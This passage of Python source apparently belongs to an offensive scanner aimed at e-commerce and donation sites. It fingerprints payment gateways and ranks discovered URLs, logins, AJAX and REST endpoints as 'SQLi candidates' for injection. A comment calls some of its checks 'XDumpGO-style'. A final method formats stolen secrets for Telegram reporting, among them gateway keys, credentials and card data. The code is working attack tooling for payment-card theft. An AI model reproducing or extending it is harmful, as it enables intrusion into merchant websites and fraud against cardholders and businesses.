        authnet_sigs = [
            'accept.js', 'jstest.authorize.net', 'js.authorize.net',
            'acceptui', 'authorizenet', 'x_login', 'apiloginid',
        ]
        if any(sig in html_lower for sig in authnet_sigs):
            info['gateways'].append('Authorize.net')
        
        # NMI
        nmi_sigs = ['secure.networkmerchants.com', 'collectjs', 'collect.js', 'nmi_']
        if any(sig in html_lower for sig in nmi_sigs):
            info['gateways'].append('NMI')
        
        # ========== XDumpGO-STYLE ADDITIONAL GATEWAYS ==========
        
        # Razorpay
        razorpay_sigs = ['checkout.razorpay.com', 'razorpay.js', 'rzp_live_', 'rzp_test_']
        if any(sig in html_lower for sig in razorpay_sigs):
            info['gateways'].append('Razorpay')
        
        # Mollie
        mollie_sigs = ['mollie.com', 'js.mollie.com', 'mollie-components']
        if any(sig in html_lower for sig in mollie_sigs):
            info['gateways'].append('Mollie')
        
        # Klarna
        klarna_sigs = ['klarna.com', 'klarna-payments', 'klarna_client_token', 'x.klarnacdn.net']
        if any(sig in html_lower for sig in klarna_sigs):
            info['gateways'].append('Klarna')
        
        # Affirm
        affirm_sigs = ['cdn1.affirm.com', 'affirm.js', 'affirm_config', 'data-public-api-key']
        if any(sig in html_lower for sig in affirm_sigs):
            info['gateways'].append('Affirm')
        
        # Afterpay/Clearpay
        afterpay_sigs = ['afterpay.com', 'clearpay.com', 'portal.afterpay.com', 'afterpay-sdk']
        if any(sig in html_lower for sig in afterpay_sigs):
            info['gateways'].append('Afterpay')
        
        # Sezzle
        sezzle_sigs = ['sezzle.com', 'widget.sezzle.com', 'sezzle-checkout']
        if any(sig in html_lower for sig in sezzle_sigs):
            info['gateways'].append('Sezzle')
        
        # Worldpay
        worldpay_sigs = ['secure.worldpay.com', 'worldpay.js', 'worldpay-cse']
        if any(sig in html_lower for sig in worldpay_sigs):
            info['gateways'].append('Worldpay')
        
        # 2Checkout/Verifone
        twocheckout_sigs = ['2checkout.com', 'avangate.com', 'verifone.com']
        if any(sig in html_lower for sig in twocheckout_sigs):
            info['gateways'].append('2Checkout')
        
        # PayU
        payu_sigs = ['payu.in', 'payubiz.in', 'secure.payu.in']
        if any(sig in html_lower for sig in payu_sigs):
            info['gateways'].append('PayU')
        
        # CyberSource
        cybersource_sigs = ['flex-microform', 'cybersource.com', 'sonsofsecurity.com']
        if any(sig in html_lower for sig in cybersource_sigs):
            info['gateways'].append('CyberSource')
        
        # First Data/Fiserv
        firstdata_sigs = ['firstdata.com', 'payeezy.com', 'api.payeezy.com']
        if any(sig in html_lower for sig in firstdata_sigs):
            info['gateways'].append('First Data')
        
        # Global Payments
        globalpay_sigs = ['globalpayments.com', 'rxp-js', 'realexpayments']
        if any(sig in html_lower for sig in globalpay_sigs):
            info['gateways'].append('Global Payments')
        
        # GoCardless
        gocardless_sigs = ['gocardless.com', 'pay.gocardless.com']
        if any(sig in html_lower for sig in gocardless_sigs):
            info['gateways'].append('GoCardless')
        
        # Recurly
        recurly_sigs = ['recurly.com', 'js.recurly.com', 'recurly-elements']
        if any(sig in html_lower for sig in recurly_sigs):
            info['gateways'].append('Recurly')
        
        # Chargebee
        chargebee_sigs = ['chargebee.com', 'js.chargebee.com', 'chargebee.js']
        if any(sig in html_lower for sig in chargebee_sigs):
            info['gateways'].append('Chargebee')
        
        # Paddle
        paddle_sigs = ['paddle.com', 'cdn.paddle.com', 'paddle.setup']
        if any(sig in html_lower for sig in paddle_sigs):
            info['gateways'].append('Paddle')
        
        # Plaid (Banking)
        plaid_sigs = ['plaid.com', 'cdn.plaid.com', 'plaid-link']
        if any(sig in html_lower for sig in plaid_sigs):
            info['gateways'].append('Plaid')
        
        # Indian Payment Gateways
        paytm_sigs = ['paytm.com', 'securegw.paytm.in', 'pgp.paytm.com']
        if any(sig in html_lower for sig in paytm_sigs):
            info['gateways'].append('Paytm')
        
        phonepe_sigs = ['phonepe.com', 'api.phonepe.com']
        if any(sig in html_lower for sig in phonepe_sigs):
            info['gateways'].append('PhonePe')
        
        instamojo_sigs = ['instamojo.com', 'api.instamojo.com']
        if any(sig in html_lower for sig in instamojo_sigs):
            info['gateways'].append('Instamojo')
        
        # Form type — more precise checks (avoid CSS-only matches)
        # Strip <style> blocks before checking form types to avoid false positives
        import re as _re
        html_no_style = _re.sub(r'<style[^>]*>[\s\S]*?</style>', '', html, flags=_re.I)
        html_no_style_lower = html_no_style.lower()
        
        if ('woocommerce' in html_no_style_lower and 
            ('wc-checkout' in html_no_style_lower or 
             'wc_checkout_params' in html_no_style_lower or 
             '/wc-ajax/' in html_no_style_lower or
             'woocommerce-cart' in html_no_style_lower or
             'class="woocommerce' in html_no_style_lower)):
            info['form_type'] = 'WooCommerce'
        elif 'give-form' in html_lower or 'give_vars' in html_lower or 'give-donation' in html_lower:
            info['form_type'] = 'GiveWP'
        elif ('gravityforms' in html_lower or 'gform_submit' in html_lower or
              'gform_wrapper' in html_lower):
            info['form_type'] = 'Gravity Forms'
        elif 'wpforms' in html_lower or 'wpforms-submit' in html_lower:
            info['form_type'] = 'WPForms'
        elif 'ninja-forms' in html_lower:
            info['form_type'] = 'Ninja Forms'
        elif 'formidable' in html_lower:
            info['form_type'] = 'Formidable Forms'
        elif 'elementor-form' in html_lower:
            info['form_type'] = 'Elementor Forms'
        elif 'wpcf7' in html_lower or 'contact-form-7' in html_lower:
            info['form_type'] = 'Contact Form 7'
        
        # AJAX
        if 'admin-ajax.php' in html_lower or 'ajaxurl' in html_lower:
            info['has_ajax'] = True
        
        # Nonces — must be actual WP nonce values, not just the word
        if re.search(r'_wpnonce["\s:=]+["\']?[a-f0-9]{8,}', html, re.I):
            info['has_nonce'] = True
        elif re.search(r'nonce["\s:=]+["\']?[a-f0-9]{8,}', html, re.I):
            info['has_nonce'] = True
        
        # Captcha
        if 'recaptcha' in html_lower or 'hcaptcha' in html_lower or 'turnstile' in html_lower:
            info['has_captcha'] = True
        
        return info

    def discover_endpoints(self, html: str, base_url: str) -> dict:
        """Discover all interesting endpoints from page HTML.
        
        Finds:
        - AJAX endpoints (admin-ajax.php, wc-ajax, custom)
        - REST API endpoints (wp-json)
        - Form action URLs
        - Login/admin pages
        - File upload endpoints
        - Search endpoints
        - URLs with parameters (SQLi candidates)
        - External API calls
        """
        from urllib.parse import urljoin, urlparse as _urlparse
        
        parsed = _urlparse(base_url)
        domain = parsed.netloc
        endpoints = {
            "ajax_endpoints": [],
            "rest_api": [],
            "form_actions": [],
            "login_pages": [],
            "search_endpoints": [],
            "param_urls": [],  # URLs with ?param= (SQLi candidates)
            "file_upload": [],
            "admin_pages": [],
            "api_calls": [],
            "interesting_js": [],
            "hidden_fields": [],      # Hidden form inputs with values
            "js_api_urls": [],        # API URLs found in JS code
            "internal_paths": [],     # Internally linked paths worth scanning
        }
        
        # 1. AJAX endpoints
        ajax_matches = re.findall(
            r'["\']([^"\']*/admin-ajax\.php[^"\']*)["\'\s]', html, re.I
        )
        for m in ajax_matches:
            full = urljoin(base_url, m)
            if full not in endpoints['ajax_endpoints']:
                endpoints['ajax_endpoints'].append(full)
        
        # WC-AJAX endpoints
        wc_ajax = re.findall(
            r'["\']([^"\']*/\?wc-ajax=[^"\']*)["\'\s]', html, re.I
        )
        for m in wc_ajax:
            full = urljoin(base_url, m)
            if full not in endpoints['ajax_endpoints']:
                endpoints['ajax_endpoints'].append(full)
        
        # ajaxurl variable
        ajaxurl_match = re.search(
            r'ajaxurl["\s:=]+["\']([^"\']*/admin-ajax\.php)["\']', html, re.I
        )
        if ajaxurl_match:
            full = urljoin(base_url, ajaxurl_match.group(1).replace('\\/', '/'))
            if full not in endpoints['ajax_endpoints']:
                endpoints['ajax_endpoints'].append(full)
        
        # 2. REST API endpoints
        rest_matches = re.findall(
            r'["\']([^"\']*/wp-json/[^"\']*)["\'\s]', html, re.I
        )
        for m in rest_matches:
            full = urljoin(base_url, m.replace('\\/', '/').split('&amp;')[0])
            if full not in endpoints['rest_api']:
                endpoints['rest_api'].append(full)
        
        # Generic API endpoints
        api_matches = re.findall(
            r'["\']([^"\']*/api/v[0-9]+/[^"\']*)["\'\s]', html, re.I
        )
        for m in api_matches:
            full = urljoin(base_url, m)
            if _urlparse(full).netloc == domain and full not in endpoints['rest_api']:
                endpoints['rest_api'].append(full)
        
        # 3. Form action URLs
        form_actions = re.findall(
            r'<form[^>]*action=["\']([^"\']*)["\'\s]', html, re.I
        )
        for action in form_actions:
            if action and action != '#' and not action.startswith('javascript:'):
                full = urljoin(base_url, action)
                if full not in endpoints['form_actions']:
                    endpoints['form_actions'].append(full)
        
        # 4. Login/admin pages
        login_patterns = re.findall(
            r'href=["\']([^"\']*/(?:wp-login|login|signin|admin|wp-admin|account|user|auth)[^"\']*)["\'\s]',
            html, re.I
        )
        for m in login_patterns:
            full = urljoin(base_url, m)
            if _urlparse(full).netloc == domain:
                if full not in endpoints['login_pages']:
                    endpoints['login_pages'].append(full)
        
        # 5. Search endpoints
        search_patterns = re.findall(
            r'action=["\']([^"\']*)["\'\s][^>]*>\s*(?:<[^>]*>)*\s*<input[^>]*name=["\']s["\'\s]',
            html, re.I
        )
        for m in search_patterns:
            full = urljoin(base_url, m) if m else base_url
            endpoints['search_endpoints'].append(full + '?s=')
        if not endpoints['search_endpoints']:
            # Check for standard WP search
            if 'wp-content' in html.lower():
                endpoints['search_endpoints'].append(base_url + '/?s=')
        
        # 6. URLs with parameters (SQLi candidates)
        param_urls = re.findall(
            r'href=["\']([^"\']*/[^"\']* \?[^"\']*)["\'\s]', html, re.I
        )
        # Simpler pattern for URLs with query params
        param_urls2 = re.findall(
            r'href=["\']([^"\s]*\?[a-zA-Z_]+=(?:[^"\']|%)[^"\']*)["\'\s]', html, re.I
        )
        for m in param_urls + param_urls2:
            full = urljoin(base_url, m)
            p = _urlparse(full)
            # Only same-domain, with real params
            if p.netloc == domain and p.query and full not in endpoints['param_urls']:
                endpoints['param_urls'].append(full)
        
        # 7. File upload endpoints
        upload_matches = re.findall(
            r'<input[^>]*type=["\']file["\'\s][^>]*>', html, re.I
        )
        if upload_matches:
            # Find the parent form
            for form_match in re.finditer(r'<form[^>]*action=["\']([^"\']*)["\'\s][^>]*>([\s\S]{0,2000}?)</form>', html, re.I):
                if 'type="file"' in form_match.group(2) or "type='file'" in form_match.group(2):
                    full = urljoin(base_url, form_match.group(1))
                    endpoints['file_upload'].append(full)
        
        # 8. Admin pages
        admin_patterns = re.findall(
            r'href=["\']([^"\']*/(?:wp-admin|admin|administrator|backend|dashboard|cpanel)[^"\']*)["\'\s]',
            html, re.I
        )
        for m in admin_patterns:
            full = urljoin(base_url, m)
            if _urlparse(full).netloc == domain and full not in endpoints['admin_pages']:
                endpoints['admin_pages'].append(full)
        
        # 9. Interesting JS files (config, gateway, checkout)
        js_files = re.findall(
            r'src=["\']([^"\']*/(?:config|settings|gateway|checkout|payment|billing|stripe|braintree|paypal)[^"\']*.js[^"\']*)["\'\s]',
            html, re.I
        )
        for m in js_files:
            full = urljoin(base_url, m)
            if full not in endpoints['interesting_js']:
                endpoints['interesting_js'].append(full)
        
        # 10. External API calls embedded in JS
        try:
            ext_api = re.findall(
                r'["\'](https?://(?!' + re.escape(domain) + r')[^"\']*?/api/[^"\']*)["\'\s]',
                html, re.I
            )
        except Exception:
            ext_api = []
        for m in ext_api[:10]:
            if m not in endpoints['api_calls']:
                endpoints['api_calls'].append(m)
        
        # 11. Hidden form fields — may contain tokens, IDs, CSRF, debug flags
        hidden_fields = re.findall(
            r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            html, re.I
        )
        # Also match reversed order: value before name
        hidden_fields2 = re.findall(
            r'<input[^>]*value=["\']([^"\']*)["\'][^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\']',
            html, re.I
        )
        for name_val, val in hidden_fields:
            entry = {"name": name_val, "value": val}
            if entry not in endpoints['hidden_fields']:
                endpoints['hidden_fields'].append(entry)
        for val, name_val in hidden_fields2:
            entry = {"name": name_val, "value": val}
            if entry not in endpoints['hidden_fields']:
                endpoints['hidden_fields'].append(entry)
        
        # 12. JS-embedded API URLs — fetch/axios/XMLHttpRequest targets
        js_api_patterns = [
            # fetch("url") or fetch('url')
            re.compile(r'fetch\s*\(\s*["\']([^"\']+?/[^"\']*)["\']', re.I),
            # axios.get/post/put/delete("url")
            re.compile(r'axios\.(?:get|post|put|delete|patch)\s*\(\s*["\']([^"\']+?/[^"\']*)["\']', re.I),
            # $.ajax({ url: "..." })  or  $.get/$.post("url")
            re.compile(r'\$\.(?:ajax|get|post)\s*\(\s*(?:\{\s*url\s*:\s*)?["\']([^"\']+?/[^"\']*)["\']', re.I),
            # XMLHttpRequest.open("METHOD", "url")
            re.compile(r'\.open\s*\(\s*["\'](?:GET|POST|PUT|DELETE)["\']\s*,\s*["\']([^"\']+?/[^"\']*)["\']', re.I),
            # var apiUrl = "/api/..." assignment
            re.compile(r'(?:api[_\-]?(?:url|endpoint|base|host|path)|endpoint|base_url)\s*[:=]\s*["\']([^"\']+?/[^"\']*)["\']', re.I),
        ]
        for pat in js_api_patterns:
            for m in pat.finditer(html):
                api_url = m.group(1)
                if api_url.startswith(('/', 'http')):
                    full = urljoin(base_url, api_url)
                    if full not in endpoints['js_api_urls']:
                        endpoints['js_api_urls'].append(full)
        
        # 13. Internal paths worth scanning — .php, .asp, .jsp with params 
        internal_links = re.findall(
            r'href=["\']([^"\']*\.(?:php|asp|aspx|jsp|cgi|pl)\?[^"\']*)["\']', html, re.I
        )
        for m in internal_links:
            full = urljoin(base_url, m)
            p = _urlparse(full)
            if p.netloc == domain and full not in endpoints['internal_paths'] and full not in endpoints['param_urls']:
                endpoints['internal_paths'].append(full)
        
        return endpoints

    def get_sqli_candidates(self, endpoints: dict, base_url: str) -> list:
        """Extract URLs most likely to be SQLi-injectable from discovered endpoints.
        
        Returns list of dicts: {url, type, priority}
        Priority: 1=highest (param URLs), 2=medium (search, forms), 3=lower (API)
        """
        candidates = []
        seen = set()
        
        # Priority 1: URLs with existing parameters (direct injection targets)
        for url in endpoints.get('param_urls', []):
            if url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "parameter_url", "priority": 1})
        
        # Priority 2: Search endpoints
        for url in endpoints.get('search_endpoints', []):
            test_url = url + "test'"
            if test_url not in seen:
                seen.add(test_url)
                candidates.append({"url": url + "test", "type": "search", "priority": 2})
        
        # Priority 2: Form action URLs with parameters
        for url in endpoints.get('form_actions', []):
            if '?' in url and url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "form_action", "priority": 2})
        
        # Priority 3: REST API endpoints with query parameters
        for url in endpoints.get('rest_api', []):
            # Only include REST API URLs that actually have query parameters
            # Path-based IDs like /pages/123 aren't injectable via query param testing
            if '=' in url and url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "rest_api", "priority": 3})
        
        # Priority 3: AJAX endpoints (need action parameter)
        for url in endpoints.get('ajax_endpoints', []):
            # Skip backslash-escaped URLs (malformed)
            if '\\' in url:
                continue
            # If URL already has query params, use & to append; otherwise use ?
            if '?' in url and '=' in url:
                test_url = url  # Already has params, test as-is
            elif '?' in url:
                # Has ? but no = (e.g., ?action), add =test&id=1
                test_url = url + "=test&id=1"
            else:
                test_url = url + "?action=test&id=1"
            if test_url not in seen:
                seen.add(test_url)
                candidates.append({"url": test_url, "type": "ajax", "priority": 3})
        
        # Priority 2: Login pages (often have user lookup SQLi)
        for url in endpoints.get('login_pages', []):
            if url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "login", "priority": 2})
        
        # Priority 2: Internal .php/.asp/.jsp paths with params
        for url in endpoints.get('internal_paths', []):
            if url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "internal_param", "priority": 2})
        
        # Priority 3: JS API URLs with params
        for url in endpoints.get('js_api_urls', []):
            if '=' in url and url not in seen:
                seen.add(url)
                candidates.append({"url": url, "type": "js_api", "priority": 3})
        
        # Sort by priority
        candidates.sort(key=lambda x: x['priority'])
        
        return candidates

    def format_for_telegram(self, secrets: List[ExtractedSecret]) -> str:
        """Format secrets for Telegram reporting."""
        if not secrets:
            return ""
        
        lines = []
        
        # Group by category
        by_category: Dict[str, List[ExtractedSecret]] = {}
        for s in secrets:
            by_category.setdefault(s.category, []).append(s)
        
        category_icons = {
            "gateway": "🔑",
            "cloud": "☁️",
            "database": "🗄️",
            "api": "🔗",
            "credential": "🔐",
            "config": "⚙️",
            "card_data": "💳",
            "sensitive_file": "📄",
        }
        
        for category, items in by_category.items():
            icon = category_icons.get(category, "📌")
            lines.append(f"\n{icon} <b>{category.upper()}</b>")
            
            for s in items:
                lines.append(f"  <b>{s.key_name}</b>")
                lines.append(f"  <code>{s.value}</code>")
                lines.append(f"  📍 {s.url}")
                lines.append("")
        
        return "\n".join(lines)
